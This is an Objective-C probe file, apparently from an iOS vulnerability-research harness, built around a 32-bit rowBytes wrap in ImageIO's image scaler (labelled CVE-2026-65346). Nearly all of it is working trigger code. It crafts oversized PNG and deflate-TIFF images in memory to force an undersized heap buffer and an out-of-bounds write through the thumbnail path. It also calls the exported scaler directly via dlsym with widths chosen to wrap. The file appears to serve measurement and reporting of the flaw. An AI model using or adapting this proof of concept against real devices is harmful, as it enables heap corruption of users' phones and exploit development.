//  probe_imageio_65346.m - DirtySlide ROW M: IMAGEIO 65346 SCALER-WRAP (v179)
//
//  THE BUG (26.6.1 diff audit, REPORT_26_6_1_DIFF #1 = CVE-2026-65346):
//  ImageIO _CGImageCreateByScaling (iio71 @0x18654d44c) computes the CG-fallback
//  rowBytes as a 32-BIT product: `mul w22, w27, w8` @0x18654daa0 (dstWidth * bpp,
//  w22 = u32 result of a 64-bit multiply whose low 32 bits are kept) -> for
//  dstWidth * bpp >= 2^32 the malloc is UNDERSIZED and the scale blit fills rows
//  of the TRUE (declared) geometry = controlled heap overflow with attacker-
//  controlled content. 26.6.1 (23G83) adds the 64-bit gate
//  "CG fallback rowBytes overflow: dstWidth=%zu * bpp=%u" +
//  "image dimensions exceed UINT32_MAX: %zu x %zu" (both strings ABSENT in iio71
//  - verified by byte scan; PRESENT in iio83).
//  Sibling (same patch): IIOPixelProvider::iterateOverImage plane alloc
//  bytesPerRow*height 32-bit wrap ("invalid row bytes (src=%u dst=%u)" in iio83).
//
//  RECON (macOS-27 + iio71 disasm):
//  - CGImageSourceCreateThumbnailAtIndex NEVER upscales past the source dims
//    (measured: 64x64 src + maxPixelSize 2^30 -> 64x64 out). So dstW <= srcW and
//    the public chain needs a HUGE-WIDTH SOURCE image that still decodes.
//  - The decode plane alloc is the reachable-dims clamp: measured on macOS 27
//    (patched): W=65536 and W=131072 decode fine; W=262144+ is rejected. The iOS
//    26.6 plugin limits are UNKNOWN BY DESIGN = this row measures them.
//  - _CGImageCreateByScaling IS an exported symbol of the iio71 ImageIO binary
//    (nm -gU confirmed @0x18654d44c) = dlsym-able in-process on the device
//    (it is hidden in the macOS-27 cache = the direct arm is device-only).
//    _CGImageSourceCreateThumbnailAtIndex is likewise exported (WebCore imports it).
//
//  CELLS:
//   IOT00 control: small in-memory PNG -> thumbnail decode = the sanity receipt.
//   IOT01 THE WRAP: CGImageSourceCreateThumbnailAtIndex(maxPixelSize ~= W) on a
//     crafted W*bpp >= 2^32 source -> if the 26.6 plugin decodes it, the scaler
//     wraps: undersized malloc + row fill = SIGSEGV/heap-corruption under the
//     guard (FAULTED @0x.. = THE OOB WRITE consumed on 23G71).
//   IOT02 the alternate arm: direct dlsym _CGImageCreateByScaling(dstW=2^30, bpp 4
//     => rowBytes wraps to 0) = the deterministic scaler shot, no decode limits.
//   IOT03 the width ladder: decode-reachability clamp characterization
//     (65536..2^30) = the "nearest-reachable variant" answer for the report.
//   IOH01..04 = the standard 1x1 H264 daemon beats.
//
//  All image bytes are built IN MEMORY (self-contained fixed-huffman deflate
//  encoder, zlib-wrapped; PNG + deflate-TIFF containers). NO disk writes.
//  Everything freed on every path (G5). A PANIC on IOT01/IOT02 = THE 64747.

#import "ds_core.h"

/* ---------------- tiny fixed-huffman deflate (solid runs) ---------------- */

typedef struct {
    uint8_t *buf;
    size_t len, cap;
    uint32_t acc;
    int nbits;
} io_bw_t;

static void io_bw_byte(io_bw_t *b, uint8_t v)
{
    if (b->len == b->cap) {
        b->cap = b->cap ? b->cap * 2 : (1 << 16);
        b->buf = (uint8_t *)realloc(b->buf, b->cap);
        if (!b->buf) { b->cap = b->len = 0; return; }
    }
    b->buf[b->len++] = v;
}

static void io_bw_bit(io_bw_t *b, int bit)
{
    b->acc |= (uint32_t)(bit & 1) << b->nbits;
    if (++b->nbits == 8) { io_bw_byte(b, (uint8_t)b->acc); b->acc = 0; b->nbits = 0; }
}

static void io_bw_huff(io_bw_t *b, uint32_t code, int n)   /* huffman codes: MSB first */
{
    for (int i = n - 1; i >= 0; i--) io_bw_bit(b, (int)((code >> i) & 1));
}

static void io_bw_extra(io_bw_t *b, uint32_t v, int n)     /* extra bits: LSB first */
{
    for (int i = 0; i < n; i++) io_bw_bit(b, (int)((v >> i) & 1));
}

static const uint32_t io_len_base[29] = { 3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,
                                          51,59,67,83,99,115,131,163,195,227,258 };
static const uint8_t  io_len_xtra[29] = { 0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0 };

static void io_bw_len_code(io_bw_t *b, uint32_t L)         /* 3..258 */
{
    int i = 28;
    while (i > 0 && io_len_base[i] > L) i--;
    uint32_t code = 257 + (uint32_t)i;
    if (code <= 279) io_bw_huff(b, code - 256, 7);
    else             io_bw_huff(b, 0xC0 + (code - 280), 8);
    io_bw_extra(b, L - io_len_base[i], io_len_xtra[i]);
}

/* deflate `count` copies of byte `val`; raw=0 -> zlib wrapper + adler32 */
static uint8_t *io_deflate_run(uint8_t val, size_t count, int raw, size_t *out_len)
{
    io_bw_t b; memset(&b, 0, sizeof(b));
    if (!raw) { io_bw_byte(&b, 0x78); io_bw_byte(&b, 0x01); }
    io_bw_bit(&b, 1);                          /* BFINAL = 1 */
    io_bw_bit(&b, 1); io_bw_bit(&b, 0);        /* BTYPE = 01 fixed huffman */
    io_bw_huff(&b, 0x30 + val, 8);             /* literal val */
    if (count >= 2) io_bw_huff(&b, 0x30 + val, 8);
    size_t left = count >= 2 ? count - 2 : 0;
    while (left >= 3) {
        uint32_t L = left >= 258 ? 258 : (uint32_t)left;
        if (L == 258) io_bw_huff(&b, 0xC5, 8); /* length code 285 = L 258 */
        else          io_bw_len_code(&b, L);
        io_bw_huff(&b, 0, 5);                  /* dist code 0 = dist 1 */
        left -= L;
    }
    while (left > 0) { io_bw_huff(&b, 0x30 + val, 8); left--; }
    io_bw_huff(&b, 0, 7);                      /* end of block */
    if (b.nbits) io_bw_byte(&b, (uint8_t)b.acc);
    if (!raw) {
        uint32_t a = (uint32_t)(val + 1) % 65521;
        uint32_t s = (uint32_t)(((uint64_t)count % 65521) * ((uint64_t)(val + 1) % 65521) % 65521);
        uint32_t ad = (s << 16) | a;
        io_bw_byte(&b, (uint8_t)(ad >> 24)); io_bw_byte(&b, (uint8_t)(ad >> 16));
        io_bw_byte(&b, (uint8_t)(ad >> 8));  io_bw_byte(&b, (uint8_t)ad);
    }
    *out_len = b.len;
    return b.buf;
}

/* ---------------- PNG / TIFF containers ---------------- */

static uint32_t io_crc32(const uint8_t *p, size_t n)
{
    uint32_t c = 0xFFFFFFFFu;
    for (size_t i = 0; i < n; i++) {
        c ^= p[i];
        for (int k = 0; k < 8; k++) c = (c >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(c & 1)));
    }
    return c ^ 0xFFFFFFFFu;
}

static void io_png_chunk(CFMutableDataRef d, const char *type, const uint8_t *body, size_t n)
{
    uint8_t hdr[4], *m = (uint8_t *)malloc(n + 4);
    if (!m) return;
    memcpy(m, type, 4);                        /* chunk = len | type | body | crc */
    if (n) memcpy(m + 4, body, n);
    hdr[0] = (uint8_t)(n >> 24); hdr[1] = (uint8_t)(n >> 16);
    hdr[2] = (uint8_t)(n >> 8);  hdr[3] = (uint8_t)n;
    CFDataAppendBytes(d, hdr, 4);
    CFDataAppendBytes(d, m, (CFIndex)(n + 4));
    uint32_t crc = io_crc32(m, n + 4);
    uint8_t c4[4] = { (uint8_t)(crc >> 24), (uint8_t)(crc >> 16), (uint8_t)(crc >> 8), (uint8_t)crc };
    CFDataAppendBytes(d, c4, 4);
    free(m);
}

/* PNG: W x H, 8-bit grayscale, one IDAT of solid pixels */
static CFDataRef io_make_png(uint32_t W, uint32_t H)
{
    uint8_t ihdr[13];
    ihdr[0] = (uint8_t)(W >> 24); ihdr[1] = (uint8_t)(W >> 16); ihdr[2] = (uint8_t)(W >> 8); ihdr[3] = (uint8_t)W;
    ihdr[4] = (uint8_t)(H >> 24); ihdr[5] = (uint8_t)(H >> 16); ihdr[6] = (uint8_t)(H >> 8); ihdr[7] = (uint8_t)H;
    ihdr[8] = 8; ihdr[9] = 0; ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
    size_t rowlen = 1 + (size_t)W;
    size_t total = rowlen * (size_t)H;
    size_t zlen = 0;
    uint8_t *z = io_deflate_run(0x00, total, 0, &zlen);
    if (!z) return NULL;
    CFMutableDataRef d = CFDataCreateMutable(kCFAllocatorDefault, 0);
    if (d) {
        CFDataAppendBytes(d, (const uint8_t *)"\x89PNG\r\n\x1a\n", 8);
        io_png_chunk(d, "IHDR", ihdr, 13);
        io_png_chunk(d, "IDAT", z, zlen);
        io_png_chunk(d, "IEND", (const uint8_t *)"", 0);
    }
    free(z);
    return d;
}

/* TIFF: classic little-endian, deflate (compression 8 = zlib-wrapped), one strip */
static CFDataRef io_make_tiff(uint32_t W, uint32_t H)
{
    size_t zlen = 0;
    uint8_t *z = io_deflate_run(0x00, (size_t)W * H, 0, &zlen);
    if (!z) return NULL;
    CFMutableDataRef d = CFDataCreateMutable(kCFAllocatorDefault, 0);
    if (d) {
        uint8_t hdr[8] = { 'I', 'I', 0x2a, 0, 8, 0, 0, 0 };
        CFDataAppendBytes(d, hdr, 8);
        const int nent = 10;
        uint8_t ifd[2 + 10 * 12 + 4];
        memset(ifd, 0, sizeof(ifd));
        ifd[0] = (uint8_t)nent; ifd[1] = 0;
        uint8_t *e = ifd + 2;
        uint32_t strip_off = 8 + (uint32_t)sizeof(ifd);
#define IO_TENTRY(tag, typ, cnt, val) do { \
            e[0] = (uint8_t)(tag); e[1] = (uint8_t)((tag) >> 8); \
            e[2] = (uint8_t)(typ); e[3] = (uint8_t)((typ) >> 8); \
            e[4] = (uint8_t)(cnt); e[5] = (uint8_t)((cnt) >> 8); \
            e[6] = (uint8_t)((cnt) >> 16); e[7] = (uint8_t)((cnt) >> 24); \
            e[8] = (uint8_t)(val); e[9] = (uint8_t)((val) >> 8); \
            e[10] = (uint8_t)((val) >> 16); e[11] = (uint8_t)((val) >> 24); \
            e += 12; } while (0)
        IO_TENTRY(256, 4, 1, W);             /* ImageWidth   */
        IO_TENTRY(257, 4, 1, H);             /* ImageLength  */
        IO_TENTRY(258, 3, 1, 8);             /* BitsPerSample */
        IO_TENTRY(259, 3, 1, 8);             /* Compression 8 = Deflate */
        IO_TENTRY(262, 3, 1, 1);             /* Photometric BlackIsZero */
        IO_TENTRY(273, 4, 1, strip_off);     /* StripOffsets */
        IO_TENTRY(277, 3, 1, 1);             /* SamplesPerPixel */
        IO_TENTRY(278, 4, 1, H);             /* RowsPerStrip */
        IO_TENTRY(279, 4, 1, (uint32_t)zlen);/* StripByteCounts */
        IO_TENTRY(284, 3, 1, 1);             /* PlanarConfig */
        CFDataAppendBytes(d, ifd, sizeof(ifd));
        CFDataAppendBytes(d, z, (CFIndex)zlen);
    }
    free(z);
    return d;
}

/* ---------------- the arms ---------------- */

typedef void *io_scal_fn(void *, size_t, size_t, uint32_t);

/* one thumbnail cell: src (already-crafted CFData) + maxPixelSize.
 * decodeOnly=1 -> CGImageSourceCreateImageAtIndex only (the reachability probe);
 * decodeOnly=0 -> the thumbnail = the wrap trigger. */
static void io_cell(const char *pfx, const char *tag, const char *note,
                    CFDataRef data, size_t maxPixelSize, int decodeOnly)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "IIO %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s== IOT %s ==\n", pfx, tag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s\n", pfx, tag, note);
    dprintf(STDOUT_FILENO, "%s  I[%s] src=%ld bytes maxPixelSize=%zu decodeOnly=%d\n",
            pfx, tag, data ? (long)CFDataGetLength(data) : -1L, maxPixelSize, decodeOnly);
    if (!data) {
        dprintf(STDOUT_FILENO, "%s  I[%s] craft OOM - cell void\n", pfx, tag);
        ds_journal_write("DONE", stag);
        return;
    }
    __block CGImageSourceRef src = NULL;
    __block CGImageRef img = NULL;
    int rc = 0;
    int sig = ds_ave_guard_run_tmo(^int {
        src = CGImageSourceCreateWithData(data, NULL);
        if (!src) return -1;
        if (decodeOnly) {
            img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
            return 0;
        }
        CFMutableDictionaryRef opts = CFDictionaryCreateMutable(kCFAllocatorDefault, 4,
            &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef mps = CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &maxPixelSize);
        if (mps) { CFDictionarySetValue(opts, kCGImageSourceThumbnailMaxPixelSize, mps); CFRelease(mps); }
        CFDictionarySetValue(opts, kCGImageSourceCreateThumbnailFromImageAlways, kCFBooleanTrue);
        CFDictionarySetValue(opts, kCGImageSourceCreateThumbnailWithTransform, kCFBooleanFalse);
        CFDictionarySetValue(opts, kCGImageSourceShouldCache, kCFBooleanFalse);
        img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
        CFRelease(opts);
        return 0;
    }, &rc, 30000);
    if (sig == SIGALRM) {
        dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (30s) - the wild geometry consumed\n", pfx, tag);
    } else if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] FAULTED sig=%d @0x%lx - THE OOB WRITE CONSUMED\n",
                pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    } else if (!src) {
        dprintf(STDOUT_FILENO, "%s  I[%s] CGImageSourceCreateWithData NULL\n", pfx, tag);
    } else if (!img) {
        dprintf(STDOUT_FILENO, "%s  I[%s] image NULL (decode rejected - the dims clamp held)\n", pfx, tag);
    } else {
        dprintf(STDOUT_FILENO, "%s  I[%s] OK %zux%zu bpp=%zu (no wrap hit)\n",
                pfx, tag, (size_t)CGImageGetWidth(img), (size_t)CGImageGetHeight(img),
                (size_t)CGImageGetBitsPerPixel(img));
    }
    if (img) CFRelease(img);
    if (src) CFRelease(src);
    ds_journal_write("DONE", stag);
}

/* IOT02: the direct arm - the exported scaler with a wrapping dstW.
 * iio71 exports _CGImageCreateByScaling @0x18654d44c (nm -gU) = dlsym-able here.
 * dstW=0x40000000 with bpp 4 => rowBytes wraps to 0; 0x40100000 => wraps to
 * 0x400000 (a 4MB alloc vs a 4GB fill). flags=0 = the CG-fallback arm. */
static void io_cell_direct(const char *pfx)
{
    ds_journal_write("START", "IIO IOT02");
    dprintf(STDOUT_FILENO, "%s== IOT IOT02 ==\n", pfx);
    io_scal_fn *fn = (io_scal_fn *)dlsym(RTLD_DEFAULT, "_CGImageCreateByScaling");
    dprintf(STDOUT_FILENO, "%s  I[IOT02] dlsym _CGImageCreateByScaling = %p\n", pfx, (void *)fn);
    if (!fn) {
        dprintf(STDOUT_FILENO, "%s  I[IOT02] NOT EXPORTED in-process - direct arm unavailable\n", pfx);
        ds_journal_write("DONE", "IIO IOT02");
        return;
    }
    /* source: 256x256 RGBA8 opaque gradient */
    const size_t sw = 256, srb = sw * 4;
    uint8_t *spx = (uint8_t *)malloc(srb * sw);
    if (!spx) { ds_journal_write("DONE", "IIO IOT02"); return; }
    for (size_t y = 0; y < sw; y++)
        for (size_t x = 0; x < sw; x++) {
            uint8_t *q = spx + y * srb + x * 4;
            q[0] = (uint8_t)x; q[1] = (uint8_t)y; q[2] = (uint8_t)(x ^ y); q[3] = 0xff;
        }
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(spx, sw, sw, 8, srb, cs, (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGImageRef simg = ctx ? CGBitmapContextCreateImage(ctx) : NULL;
    if (!simg) {
        dprintf(STDOUT_FILENO, "%s  I[IOT02] source image build FAILED\n", pfx);
    } else {
        static const size_t dims[] = { 0x40000000UL, 0x40100000UL, 0x20000000UL };
        for (unsigned i = 0; i < sizeof(dims) / sizeof(dims[0]); i++) {
            size_t dw = dims[i], dh = 8;
            dprintf(STDOUT_FILENO, "%s  I[IOT02] call dstW=%zu dstH=%zu (rowBytes=dW*4 -> 0x%08llx) ...\n",
                    pfx, dw, dh, (unsigned long long)((dw * 4) & 0xFFFFFFFFULL));
            __block CGImageRef out = NULL;
            int rc = 0, s2 = ds_ave_guard_run_tmo(^int {
                out = (CGImageRef)fn((void *)simg, dw, dh, 0);
                return 0;
            }, &rc, 30000);
            if (s2 == SIGALRM)
                dprintf(STDOUT_FILENO, "%s  I[IOT02] TIMEOUT (30s) - the scaler consumed the wrap\n", pfx);
            else if (s2 > 0)
                dprintf(STDOUT_FILENO, "%s  I[IOT02] FAULTED sig=%d @0x%lx - THE OOB WRITE CONSUMED\n",
                        pfx, s2, (unsigned long)g_ave_fault_addr);
            else if (out) {
                dprintf(STDOUT_FILENO, "%s  I[IOT02] returned %zux%zu (no crash)\n",
                        pfx, (size_t)CGImageGetWidth(out), (size_t)CGImageGetHeight(out));
                CFRelease(out);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[IOT02] returned NULL (a guard fired = patched or pre-gated)\n", pfx);
            }
        }
        CFRelease(simg);
    }
    if (ctx) CFRelease(ctx);
    if (cs) CFRelease(cs);
    free(spx);
    ds_journal_write("DONE", "IIO IOT02");
}

/* IOT03: the width ladder - the decode-reachability clamp characterization.
 * W=2^16, 2^17 (macOS 27 decodes both) then 2^18..2^30: the largest W that
 * decodes on 23G71 IS the nearest-reachable trigger (W*4 must cross 2^32). */
static void io_cell_ladder(const char *pfx)
{
    static const uint32_t ladder[] = { 65536u, 131072u, 262144u, 1048576u, 16777216u,
                                       134217728u, 536870912u, 1073741824u, 0x40100000u };
    for (unsigned i = 0; i < sizeof(ladder) / sizeof(ladder[0]); i++) {
        CFDataRef lp = io_make_png(ladder[i], 1);
        char note[96];
        snprintf(note, sizeof(note), "WIDTH LADDER: W=%u (W*4=0x%llx %s 2^32) decode probe",
                 ladder[i], (unsigned long long)ladder[i] * 4ULL,
                 ((uint64_t)ladder[i] * 4 >= (1ULL << 32)) ? ">=" : "<");
        io_cell(pfx, "IOT03", note, lp, ladder[i], 1);
        /* when W*bpp crosses 2^32 AND it decoded, the thumbnail is the wrap trigger */
        if ((uint64_t)ladder[i] * 4 >= (1ULL << 32)) {
            CFDataRef lp2 = io_make_png(ladder[i], 1);
            snprintf(note, sizeof(note), "WIDTH LADDER: W=%u THUMBNAIL = the wrap trigger arm", ladder[i]);
            io_cell(pfx, "IOT01", note, lp2, ladder[i], 0);
            if (lp2) CFRelease(lp2);
        }
        if (lp) CFRelease(lp);
    }
}

/* ------------------------------------------------------------------ */

void probe_imageio_65346(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== IO. IMAGEIO 65346 SCALER-WRAP ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  THE BUG (26.6.1 diff = CVE-2026-65346): _CGImageCreateByScaling\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (iio71 @0x18654d44c) computes the CG-fallback rowBytes as\n", pfx);
    dprintf(STDOUT_FILENO, "%s  mul w22,w27,w8 @0x18654daa0 (dstWidth*bpp, 32-BIT) -> undersized\n", pfx);
    dprintf(STDOUT_FILENO, "%s  malloc + a scale blit that fills rows of the TRUE geometry = controlled\n", pfx);
    dprintf(STDOUT_FILENO, "%s  heap overflow, attacker-controlled content. 23G83 adds the 64-bit gate\n", pfx);
    dprintf(STDOUT_FILENO, "%s  'CG fallback rowBytes overflow: dstWidth=%%zu * bpp=%%u' (ABSENT in iio71\n", pfx);
    dprintf(STDOUT_FILENO, "%s  - byte-verified). Sibling: iterateOverImage plane wrap ('invalid row\n", pfx);
    dprintf(STDOUT_FILENO, "%s  bytes (src=%%u dst=%%u)'). RECON: thumbnails never UPSCALE (dstW<=srcW),\n", pfx);
    dprintf(STDOUT_FILENO, "%s  so the public chain needs a huge-width source that still decodes; the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  26.6 decode clamp is UNKNOWN = IOT03 measures it. _CGImageCreateByScaling\n", pfx);
    dprintf(STDOUT_FILENO, "%s  IS exported by the 26.6 ImageIO = IOT02 dlsym-able in-process. Image bytes\n", pfx);
    dprintf(STDOUT_FILENO, "%s  built IN MEMORY (own fixed-huffman deflate). NO disk writes. MAY CRASH\n", pfx);
    dprintf(STDOUT_FILENO, "%s  THE APP (that is the point) - a PANIC = THE 64747.\n", pfx);

    /* IOT00: the control - the chain must work end-to-end on sane dims */
    {
        CFDataRef ctrl = io_make_png(64, 64);
        io_cell(pfx, "IOT00", "CONTROL: 64x64 gray PNG -> thumbnail maxPixelSize=32 (must decode + scale)", ctrl, 32, 0);
        if (ctrl) CFRelease(ctrl);
    }

    /* IOT01+IOT03: the ladder (decode clamp) with the wrap arms folded in */
    io_cell_ladder(pfx);

    /* IOT01b: the crafted W=0x40100000 direct pair PNG+TIFF (the report dims) */
    {
        CFDataRef pg = io_make_png(0x40100000u, 1);
        io_cell(pfx, "IOT01", "THE WRAP (PNG): W=0x40100000 (W*4=0x100400000) -> thumbnail maxPixelSize=W-4096", pg, 0x40100000UL - 0x1000UL, 0);
        if (pg) CFRelease(pg);
        CFDataRef tg = io_make_tiff(0x40100000u, 1);
        io_cell(pfx, "IOT01", "THE WRAP (TIFF): same dims via deflate-TIFF (the plugin-bypass arm)", tg, 0x40100000UL - 0x1000UL, 0);
        if (tg) CFRelease(tg);
    }

    /* IOT02: the direct exported-scaler arm */
    io_cell_direct(pfx);

    /* IOH01..04: the standard daemon beats (literal tags = marker discipline) */
    ds_ave_replay(pfx, "IOH01", 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
    usleep(500000);
    ds_ave_replay(pfx, "IOH02", 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
    usleep(500000);
    ds_ave_replay(pfx, "IOH03", 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
    usleep(500000);
    ds_ave_replay(pfx, "IOH04", 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
    usleep(500000);

    dprintf(STDOUT_FILENO, "%s  IO read-offs:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   IOT00 must print OK 32x32 - else the in-app ImageIO chain itself is\n", pfx);
    dprintf(STDOUT_FILENO, "%s   broken and every later cell is void.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   IOT01 FAULTED sig=11/10 @0x.. (with IOT00 clean) = the scaler consumed\n", pfx);
    dprintf(STDOUT_FILENO, "%s   an undersized buffer = THE OOB WRITE = CVE-2026-65346 LIVE ON 23G71.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   IOT01 image NULL at every W = the 26.6 decode clamp blocks the public\n", pfx);
    dprintf(STDOUT_FILENO, "%s   chain: the clamp constant = the largest W in the IOT03 ladder that\n", pfx);
    dprintf(STDOUT_FILENO, "%s   decoded (the report's nearest-reachable answer).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   IOT02 FAULTED = the deterministic scaler shot (no decode limits); NULL\n", pfx);
    dprintf(STDOUT_FILENO, "%s   dlsym = the symbol is hidden in-process (re-run the export audit);\n", pfx);
    dprintf(STDOUT_FILENO, "%s   a NULL return = a 26.6-side gate we have not RE'd (pull the log).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   IOT03 lines are the clamp characterization: one decode-OK line per W.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   TIMEOUT on any cell = the wild geometry consumed = escalate. A PANIC =\n", pfx);
    dprintf(STDOUT_FILENO, "%s   THE 64747.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
